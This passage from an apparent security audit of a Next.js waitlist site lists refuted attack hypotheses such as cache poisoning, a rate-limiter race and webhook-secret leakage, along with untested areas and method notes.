| R-03 | **Cache poisoning via case-variant URLs** | **Refuted.** Requesting `/EN/about` and `/AM` does not affect the cached entries for `/en/about` and `/am`. The apparent evidence for this was the stale-`.next` state in F-16. On a clean build, mixed-case locales 404 correctly and poison nothing. |
| R-04 | **Soft-404 (HTTP 200 on a cold not-found)** | **Refuted.** Five never-before-requested unknown paths returned 404 on the cold request and every subsequent one. The earlier 200 readings came from the F-16 stale build. |
| R-05 | **Concurrency race in the limiter** | **Refuted.** `rateLimit()` is fully synchronous with no `await` inside, so the read-modify-write cannot interleave on a single-threaded runtime. 100 concurrent calls with a forced microtask boundary allowed exactly 5. The concern would return if the function ever becomes async — which it will, when it moves to KV. |
| R-06 | **Honeypot usable as a success oracle** | **Refuted** as an oracle. The honeypot path returns a fake success unconditionally, so it reveals nothing about whether the real path would have succeeded. Two things are worth noting anyway: it returns *before* the rate limiter, so honeypot-filled requests are unmetered (15 of 15 returned a reference, 0 reached the handler); and it does no work, so that is cheap rather than costly. |
| R-07 | **Webhook secret leaking into logs** | **Refuted.** With `WAITLIST_WEBHOOK_URL` set to a URL containing a token and the endpoint unreachable, the logged error was `TypeError: fetch failed` with no URL. Zero occurrences of the token in the log or the client response. The user correctly saw "Your details were not saved — try again." |
| R-08 | **Type confusion via non-string form values** | **Refuted.** `str()` returns `''` for anything that is not a string, so a file in a text field fails validation rather than being coerced. Duplicate fields resolve to the first value (`fullName` sent as `FIRST` then `SECOND` delivered `FIRST`), and a duplicated `platform` does not smuggle a second value past the allowlist. The one loose edge is consent — recorded separately as F-19. |

---

## What I could not test

Stated plainly, per §5.

- **F-05, the per-isolate limiter.** Requires a real Cloudflare deployment, which §1 forbids. Reasoned from the code and from restart behaviour; the confirming measurement needs someone with a deployment.
- **Everything about the real deletion backend.** It does not exist. F-02 audits the design requirements, not an implementation.
- **Whether the Cloudflare origin is locked.** This determines F-04's real severity and cannot be established from the repository — there is no Cloudflare configuration in it.
- **The actual log sink's retention and access.** F-06 measures what is written, not where it goes or who can read it. That is a Cloudflare configuration question.
- **Browser-side behaviour.** No browser was available. Nothing here covers XSS in a rendered page beyond confirming the absence of injection sinks, clickjacking beyond the `X-Frame-Options` header, or CSP violations in practice. The eight-section `docs/manual-qa.md` remains outstanding and is not superseded by this audit.
- **F-16's mechanism.** Reproduced and characterised, root cause not identified.
- **One §3.1 case ran inconclusively:** `fullName` submitted as a file part returned a local curl error rather than a server response. The equivalent path is covered by R-08 and F-19 through the `consent` field, and by reading `str()`, but the direct test did not complete.

## Method notes

- Production build (`next build` + `next start`), not dev, because headers, caching and action behaviour differ.
- Load generated by a dependency-free Node script against `localhost` only; no third-party load tool was installed.
- Two false results were caught and discarded mid-audit rather than reported: a memory measurement taken while 40,000 requests were being rejected as invalid actions, and a success detector that matched `waitlist.success.title` in the client message payload on every page rather than an actual submission. Both were replaced with server-log entry counts as ground truth.
